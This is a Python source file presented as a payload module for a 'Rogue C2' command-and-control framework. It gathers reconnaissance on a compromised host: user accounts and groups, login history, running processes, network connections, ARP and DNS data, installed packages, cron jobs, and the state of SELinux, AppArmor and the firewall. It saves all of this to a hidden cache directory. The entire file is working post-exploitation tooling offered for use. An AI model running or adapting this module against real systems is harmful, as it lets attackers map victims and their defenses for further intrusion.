#!/usr/bin/env python3
"""
PAYLOAD: System Reconnaissance Module
DESCRIPTION: Comprehensive system/network intelligence gathering
AUTHOR: Rogue Red Team
VERSION: 2.0
"""
import platform, socket, subprocess, json, re, os, getpass, psutil, uuid, datetime, hashlib, sys
import netifaces, urllib.request, json, base64, pwd, grp

class SystemRecon:
    def __init__(self, output_dir="~/.cache/.rogue/recon"):
        self.output_dir = os.path.expanduser(output_dir)
        os.makedirs(self.output_dir, exist_ok=True)
        self.results = {}
    
    def gather_system_info(self):
        """Collect detailed system information"""
        info = {
            "timestamp": datetime.datetime.now().isoformat(),
            "hostname": socket.gethostname(),
            "fqdn": socket.getfqdn(),
            "os": {
                "system": platform.system(),
                "release": platform.release(),
                "version": platform.version(),
                "machine": platform.machine(),
                "processor": platform.processor(),
                "platform": platform.platform()
            },
            "kernel": os.uname(),
            "boot_time": datetime.datetime.fromtimestamp(psutil.boot_time()).isoformat(),
            "users": self.get_user_info(),
            "processes": self.get_running_processes(),
            "network": self.get_network_info(),
            "hardware": self.get_hardware_info(),
            "software": self.get_software_info(),
            "defenses": self.get_defense_status()
        }
        return info
    
    def get_user_info(self):
        """Get user and group information"""
        users = []
        for user in pwd.getpwall():
            try:
                groups = [g.gr_name for g in grp.getgrall() if user.pw_name in g.gr_mem]
                users.append({
                    "username": user.pw_name,
                    "uid": user.pw_uid,
                    "gid": user.pw_gid,
                    "home": user.pw_dir,
                    "shell": user.pw_shell,
                    "groups": groups,
                    "last_login": self.get_last_login(user.pw_name)
                })
            except:
                continue
        return users
    
    def get_last_login(self, username):
        """Get last login information"""
        try:
            output = subprocess.check_output(f"last -n 5 {username}", shell=True, stderr=subprocess.DEVNULL).decode()
            return output.split('\n')[0] if output else "Unknown"
        except:
            return "Unknown"
    
    def get_running_processes(self):
        """Get detailed process information"""
        processes = []
        for proc in psutil.process_iter(['pid', 'name', 'username', 'cpu_percent', 'memory_percent', 'cmdline']):
            try:
                pinfo = proc.info
                processes.append(pinfo)
            except (psutil.NoSuchProcess, psutil.AccessDenied):
                continue
        return processes[:100]  # Limit to first 100
    
    def get_network_info(self):
        """Get comprehensive network configuration"""
        network = {
            "interfaces": [],
            "connections": [],
            "routing": [],
            "dns": [],
            "arp": []
        }
        
        # Network interfaces
        for interface in netifaces.interfaces():
            addrs = netifaces.ifaddresses(interface)
            iface_info = {"name": interface, "addresses": {}}
            for addr_type in addrs:
                if addr_type == netifaces.AF_INET:
                    iface_info["addresses"]["ipv4"] = addrs[addr_type]
                elif addr_type == netifaces.AF_INET6:
                    iface_info["addresses"]["ipv6"] = addrs[addr_type]
                elif addr_type == netifaces.AF_LINK:
                    iface_info["addresses"]["mac"] = addrs[addr_type]
            network["interfaces"].append(iface_info)
        
        # Active connections
        try:
            connections = psutil.net_connections()
            for conn in connections:
                if conn.status == psutil.CONN_ESTABLISHED:
                    network["connections"].append({
                        "fd": conn.fd,
                        "family": conn.family,
                        "type": conn.type,
                        "local": conn.laddr,
                        "remote": conn.raddr,
                        "status": conn.status,
                        "pid": conn.pid
                    })
        except:
            pass
        
        # Routing table
        try:
            routes = psutil.net_if_stats()
            for iface, stats in routes.items():
                network["routing"].append({"interface": iface, "stats": stats._asdict()})
        except:
            pass
        
        # DNS and ARP
        try:
            with open('/etc/resolv.conf', 'r') as f:
                network["dns"] = f.readlines()
            
            arp_output = subprocess.check_output("arp -a", shell=True, stderr=subprocess.DEVNULL).decode()
            network["arp"] = arp_output.split('\n')
        except:
            pass
        
        return network
    
    def get_hardware_info(self):
        """Get hardware details"""
        hardware = {}
        
        try:
            # CPU
            with open('/proc/cpuinfo', 'r') as f:
                cpu_info = f.read()
            hardware["cpu"] = {
                "cores": psutil.cpu_count(),
                "threads": psutil.cpu_count(logical=True),
                "model": re.search(r'model name\s*:\s*(.+)', cpu_info).group(1) if re.search(r'model name', cpu_info) else "Unknown"
            }
            
            # Memory
            memory = psutil.virtual_memory()
            hardware["memory"] = {
                "total": memory.total,
                "available": memory.available,
                "percent": memory.percent
            }
            
            # Disks
            disks = []
            for partition in psutil.disk_partitions():
                try:
                    usage = psutil.disk_usage(partition.mountpoint)
                    disks.append({
                        "device": partition.device,
                        "mountpoint": partition.mountpoint,
                        "fstype": partition.fstype,
                        "total": usage.total,
                        "used": usage.used,
                        "free": usage.free,
                        "percent": usage.percent
                    })
                except:
                    continue
            hardware["disks"] = disks
            
        except Exception as e:
            hardware["error"] = str(e)
        
        return hardware
    
    def get_software_info(self):
        """Get installed software information"""
        software = {"packages": [], "services": [], "cron": []}
        
        try:
            # Installed packages
            if os.path.exists('/etc/debian_version'):
                packages = subprocess.check_output("dpkg -l | grep ^ii", shell=True, stderr=subprocess.DEVNULL).decode()
                software["packages"] = packages.split('\n')[:50]
            elif os.path.exists('/etc/redhat-release'):
                packages = subprocess.check_output("rpm -qa", shell=True, stderr=subprocess.DEVNULL).decode()
                software["packages"] = packages.split('\n')[:50]
            
            # Running services
            services = []
            for service in psutil.win_service_iter() if platform.system() == 'Windows' else []:
                services.append(service._asdict())
            software["services"] = services
            
            # Cron jobs
            cron_output = subprocess.check_output("crontab -l 2>/dev/null || echo 'No cron for user'", shell=True).decode()
            software["cron"] = cron_output.split('\n')
            
        except Exception as e:
            software["error"] = str(e)
        
        return software
    
    def get_defense_status(self):
        """Check security defenses"""
        defenses = {
            "selinux": False,
            "apparmor": False,
            "firewall": False,
            "ids": [],
            "antivirus": []
        }
        
        try:
            # SELinux
            if os.path.exists('/usr/sbin/sestatus'):
                selinux = subprocess.check_output("sestatus", shell=True, stderr=subprocess.DEVNULL).decode()
                defenses["selinux"] = "enabled" in selinux.lower()
            
            # AppArmor
            if os.path.exists('/sys/module/apparmor/parameters/enabled'):
                with open('/sys/module/apparmor/parameters/enabled', 'r') as f:
                    defenses["apparmor"] = f.read().strip() == 'Y'
            
            # Firewall
            try:
                firewall = subprocess.check_output("iptables -L -n 2>/dev/null || ufw status 2>/dev/null || echo 'No firewall'", shell=True).decode()
                defenses["firewall"] = "Chain INPUT" in firewall or "active" in firewall.lower()
            except:
                pass
            
        except Exception as e:
            defenses["error"] = str(e)
        
        return defenses
    
    def execute(self):
        """Main execution method"""
        try:
            print("[+] Starting system reconnaissance...")
            self.results = self.gather_system_info()
            
            # Save results
            output_file = os.path.join(self.output_dir, f"sysrecon_{socket.gethostname()}_{datetime.datetime.now().strftime('%Y%m%d_%H%M%S')}.json")
            with open(output_file, 'w') as f:
                json.dump(self.results, f, indent=2, default=str)
            
            summary = {
                "hostname": self.results["hostname"],
                "os": self.results["os"]["platform"],
                "users": len(self.results["users"]),
                "processes": len(self.results["processes"]),
                "interfaces": len(self.results["network"]["interfaces"]),
                "timestamp": self.results["timestamp"]
            }
            
            print(f"[+] Reconnaissance complete. Results saved to: {output_file}")
            return json.dumps(summary, indent=2)
            
        except Exception as e:
            return f"[!] Reconnaissance failed: {str(e)}"

# === Integration with Rogue C2 ===
def rogue_integration():
    """Wrapper for Rogue C2 integration"""
    recon = SystemRecon()
    return recon.execute()

if __name__ == "__main__":
    print(rogue_integration())
